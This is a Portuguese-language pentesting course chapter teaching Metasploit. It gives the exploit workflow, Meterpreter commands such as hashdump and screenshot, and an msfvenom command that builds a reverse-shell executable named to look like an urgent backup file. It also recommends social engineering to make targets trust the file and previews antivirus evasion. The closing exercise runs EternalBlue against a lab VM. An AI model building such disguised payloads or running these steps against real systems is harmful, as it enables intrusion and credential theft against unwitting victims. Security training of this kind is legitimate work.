# 🕷️ Capítulo 3: Exploração de Sistemas (Metasploit Masterclass)

Agora o jogo fica sério. Você já sabe se esconder (Cap. 1) e já sabe onde estão as entradas do alvo (Cap. 2). Chegou a hora de atravessar a porta. Neste capítulo, dominaremos o **Metasploit Framework**, o padrão da indústria para exploração.

---

## 🏗️ 3.1 A Anatomia de um Ataque

Para ter sucesso, você precisa entender os três pilares do Metasploit:
1.  **Exploit:** O "míssil" que carrega a carga até a vulnerabilidade.
2.  **Payload:** O "soldado" que fica dentro do sistema alvo após a explosão (ex: Meterpreter).
3.  **Auxiliary:** Ferramentas de suporte (scanners, sniffers).

---

## 🛠️ 3.2 O Fluxo de Trabalho do Pentester

Siga este roteiro em todos os ataques:
1. `search [serviço]`: Procure por falhas conhecidas (ex: `search samba`).
2. `use [exploit_path]`: Selecione o exploit que você quer usar.
3. `show options`: Configure os IPs (LHOST = Seu IP, RHOST = IP da Vítima).
4. `set PAYLOAD windows/x64/meterpreter/reverse_tcp`: Escolha sua carga.
5. `exploit` ou `run`: Dispare o ataque.

---

## 💀 3.3 Meterpreter: O Controle Total

O Meterpreter não é um shell comum; é um sistema operacional completo rodando na memória da vítima.
- `sysinfo`: Vê as informações do sistema.
- `screenshot`: Tira uma foto da tela da vítima.
- `hashdump`: Extrai as senhas criptografadas do Windows (SAM).
- `shell`: Abre o CMD ou terminal padrão da vítima.

---

## 📦 3.4 MSFVenom (Criando seu próprio Malwares Éticos)

O MSFVenom permite que você crie um arquivo executável que, quando aberto, entrega o controle para você.

**Exemplo: Criando um Executável de Resgate (Windows):**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[SEU_IP] LPORT=4444 -f exe -o backup_urgente.exe
```

::: warning 🛡️ Regra de Ouro: Antivírus
Atualmente, qualquer antivírus básico detecta payloads "crus" do MSFVenom. No Capítulo 6, aprenderemos técnicas de **Evasão**, mas o segredo aqui é o **Social Engineering** (Engenharia Social) para fazer o alvo confiar no arquivo.
:::

---

## 🧪 Desafio do Mestre: O Primeiro Acesso
1. Configure uma VM (Windows 7 ou Metasploitable 2) sem atualizações.
2. Use o Nmap para descobrir a porta 445 aberta (SMB).
3. No Metasploit, use o exploit `ms17_010_eternalblue`.
4. Obtenha um shell Meterpreter e tire um `screenshot`.

---

> [!TIP]
> **Reflexão Profissional:** Conseguir o acesso é fácil em sistemas antigos. O verdadeiro desafio é o que vem a seguir: **Guerra Wireless** (Capítulo 4), onde atacaremos sem nem precisar de um cabo de rede.
